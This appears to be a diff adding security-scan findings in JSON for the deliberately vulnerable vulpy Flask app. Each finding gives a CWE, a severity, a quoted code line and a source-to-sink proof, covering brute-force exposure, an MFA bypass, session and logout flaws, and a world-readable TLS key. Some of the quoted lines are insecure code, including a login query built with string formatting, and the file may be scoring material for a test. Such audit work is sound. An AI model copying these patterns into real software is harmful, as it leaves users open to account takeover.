+        "line": 12
+      },
+      "extra": {
+        "message": "No rate limiting or account lockout on login \u2014 brute-force possible",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "    user = c.execute(\"SELECT * FROM users WHERE username = '{}' and password = '{}'\".format(username, password)).fetchone()",
+          "proof": "SOURCE: username/password from request.form -> SINK: libuser.login() at line 12 executes the authentication query with NO rate limiting, no failure counter increment, and no account lockout check. The 'failures' column exists in the database schema but is never incremented on failed login or checked before allowing authentication. An attacker can brute-force passwords with no throttling."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-288",
+      "path": "bad/mod_api.py",
+      "start": {
+        "line": 36
+      },
+      "end": {
+        "line": 36
+      },
+      "extra": {
+        "message": "MFA bypass in API key generation",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-288"
+          ],
+          "citation": "key = libapi.keygen(data['username'], data['password'])",
+          "proof": "SOURCE: data['username'], data['password'] from JSON request body at line 29 \u2192 libapi.keygen() \u2192 libuser.login() at libapi.py:13 verifies username+password but NEVER calls libmfa.mfa_is_enabled(). SINK: mod_api.py line 36 returns an API key. An attacker with username+password but no OTP can obtain a permanent API key, bypassing MFA entirely."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-732",
+      "path": "bad/vulpy-ssl.py",
+      "start": {
+        "line": 24
+      },
+      "end": {
+        "line": 24
+      },
+      "extra": {
+        "message": "TLS private key stored in world-readable /tmp directory",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-732"
+          ],
+          "citation": "app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))",
+          "proof": "SOURCE: hardcoded path '/tmp/acme.key' \u2192 SINK: ssl_context parameter at line 24. /tmp is world-readable on Unix systems. Any local user can read the private key, decrypt TLS traffic, or impersonate the server."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 38
+      },
+      "end": {
+        "line": 38
+      },
+      "extra": {
+        "message": "Missing rate limiting on user registration",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "@mod_user.route('/create', methods=['GET', 'POST'])\ndef do_create():\n\n    session.pop('username', None)\n\n    if request.method == 'POST':\n\n        username = request.form.get('username')\n        password = request.form.get('password')\n        ...\n        libuser.create(username, password)",
+          "proof": "SOURCE: POST /user/create with username+password form fields \u2192 SINK: libuser.create() at mod_user.py:52 inserts a new user row. No rate-limiting decorator, throttling sleep, or counter exists. An attacker can script millions of registration requests, exhausting database storage."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "bad/mod_posts.py",
+      "start": {
+        "line": 19
+      },
+      "end": {
+        "line": 19
+      },
+      "extra": {
+        "message": "User enumeration via exposed userlist to all visitors",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "users = libuser.userlist()",
+          "proof": "SOURCE: do_view() (line 12) calls libuser.userlist() unconditionally with no auth gate. SINK: the userlist is rendered in posts.view.html 'Other users' sidebar (lines 32-42), which is OUTSIDE the {% if username %} guard. Unauthenticated visitors receive every registered username, enabling targeted attacks."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 80
+      },
+      "end": {
+        "line": 80
+      },
+      "extra": {
+        "message": "Session not invalidated after password change",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "libuser.password_change(g.session['username'], password) # = libuser.login(username, password)",
+          "proof": "SOURCE: existing vulpy_session cookie loaded via before_request() \u2192 g.session. SINK: libuser.password_change() updates the password in the database at line 80, but no libsession.destroy() or session rotation is called. The old stateless base64 cookie remains valid. An attacker with a stolen session cookie retains access even after the victim changes their password."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 12
+      },
+      "end": {
+        "line": 12
+      },
+      "extra": {
+        "message": "No functional logout \u2014 session cookie never destroyed",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "session.pop('username', None)",
+          "proof": "SOURCE: LOGOUT link \u2192 GET /user/login \u2192 do_login() handler. SINK: line 12 only pops 'username' from Flask's server-side session dict, never calling libsession.destroy() (which exists at libsession.py:27 but is dead code). The vulpy_session cookie persists and is still loaded by libsession.load() in before_request, so g.session continues to contain the username. Users can never actually log out."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-384",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 80
+      },
+      "end": {
+        "line": 80
+      },
+      "extra": {
+        "message": "Session not rotated after password change",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-384"
+          ],
+          "citation": "libuser.password_change(g.session['username'], password) # = libuser.login(username, password)\n        flash(\"Password changed\")",
+          "proof": "SOURCE: existing vulpy_session cookie loaded into g.session via before_request(). SINK: do_chpasswd calls password_change at line 80 then flashes success with no call to libsession.destroy() or libsession.create() to rotate the session. The old unsigned base64 session cookie remains valid after password change. An attacker with a captured session cookie retains access."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-306",
+      "path": "bad/mod_mfa.py",
+      "start": {
+        "line": 63
+      },
+      "end": {
+        "line": 63
+      },
+      "extra": {
+        "message": "MFA disable without re-authentication",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-306"
+          ],
+          "citation": "libmfa.mfa_disable(g.session['username'])",
+          "proof": "SOURCE: GET /mfa/disable with any valid session cookie. SINK: at line 63, MFA is disabled unconditionally. The sole gate at line 60 checks only if 'username' is in g.session \u2014 no password challenge, no OTP re-verification, no step-up authentication. Disabling a critical security control requires password re-entry per OWASP ASVS V2.1.3."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "bad/libsession.py",
+      "start": {
+        "line": 7
+      },
+      "end": {
+        "line": 7
+      },
+      "extra": {
+        "message": "Session cookie set without expiration",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "response.set_cookie('vulpy_session', session)",
+          "proof": "SOURCE: login at mod_user.py:30-31 calls libsession.create() \u2192 libsession.py line 7. SINK: set_cookie() called with no expires, max_age, or max-age parameter. Combined with no server-side session store or revocation list, the cookie is valid forever. An attacker who captures the cookie can reuse it indefinitely."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 33
+      },
+      "end": {
+        "line": 33
+      },
+      "extra": {
+        "message": "Logout does not destroy session cookie \u2014 user remains authenticated",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "return render_template('user.login.mfa.html')",
+          "proof": "SOURCE: user clicks LOGOUT \u2192 GET /user/login. SINK: the GET handler at line 33 returns the login template without calling libsession.destroy(). session.pop('username', None) at line 11 only clears Flask's server-side dict, not the vulpy_session cookie that drives g.session in before_request(). The vulpy_session cookie persists; g.session['username'] remains populated on all subsequent requests."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-324",
+      "path": "bad/libapi.py",
+      "start": {
+        "line": 22
+      },
+      "end": {
+        "line": 22
+      },
+      "extra": {
+        "message": "API keys have no expiration or revocation mechanism",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-324"
+          ],
+          "citation": "Path(keyfile).touch()",
+          "proof": "SOURCE: POST /api/key returns a newly created key. SINK: keygen() at libapi.py:22 creates the key file in /tmp/ via Path(keyfile).touch() with no expiry timestamp, no rotation mechanism, and no revocation endpoint. The key file persists until manual deletion or system reboot. An attacker who captures an API key can use it indefinitely with no server-side way to revoke it."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "bad/libposts.py",
+      "start": {
+        "line": 14
+      },
+      "end": {
+        "line": 14
+      },
+      "extra": {
+        "message": "Unbounded resource consumption \u2014 post listing with no LIMIT",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "rows = c.execute(\"SELECT * FROM posts WHERE username = ? ORDER BY date DESC\", (username,)).fetchall()",
+          "proof": "SOURCE: an attacker creates unlimited posts via POST /posts/ or POST /api/post with no per-user cap. SINK: get_posts() at line 14 fetches ALL posts via .fetchall() with no SQL LIMIT clause. GET /posts/<username> loads the entire result set into memory and renders it in a template, causing memory exhaustion under enough posts."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 54
+      },
+      "end": {
+        "line": 54
+      },
+      "extra": {
+        "message": "Missing rate limiting on user registration endpoint",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "libuser.create(username, password)",
+          "proof": "SOURCE: unauthenticated attacker sends POST to /user/create with arbitrary username/password form fields (lines 47-48). SINK: line 54 calls libuser.create() which performs an INSERT into the users table with no rate limiting, CAPTCHA, IP throttling, or cooldown. An attacker can loop POST requests to exhaust database resources or create spam accounts."
+        }
+      }
+    }
+  ]
+}
